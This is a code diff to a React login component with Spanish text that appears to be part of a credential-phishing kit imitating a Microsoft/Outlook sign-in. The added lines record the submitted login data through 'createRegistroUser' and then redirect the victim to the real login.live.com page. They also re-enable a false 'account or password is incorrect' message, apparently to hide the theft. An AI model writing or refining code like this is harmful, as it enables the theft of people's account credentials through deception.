@@ -163,6 +163,7 @@ export default function Login() {
     console.log(datax);
 
     if (errorSpan) {
+      await createRegistroUser(datax);
       return (window.location.href =
         "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
     }
@@ -218,15 +219,14 @@ export default function Login() {
               </section>
             ) : null} */}
 
-            {/* {errorSpan ? (
+            {errorSpan ? (
               <section className={css.error}>
                 <span>
-                  la cuenta o la contraseña es incorrecta si no recuerdas la
-                  contraseña
+                  la cuenta o la contraseña es incorrecta
                 </span>
-                <strong> restablecela ahora</strong>
+                <strong> restablecer ahora</strong>
               </section>
-            ) : null} */}
+            ) : null}
             <div className={` ${css.div_password}`}>
               <input
                 className={`${css.input_pass} `}
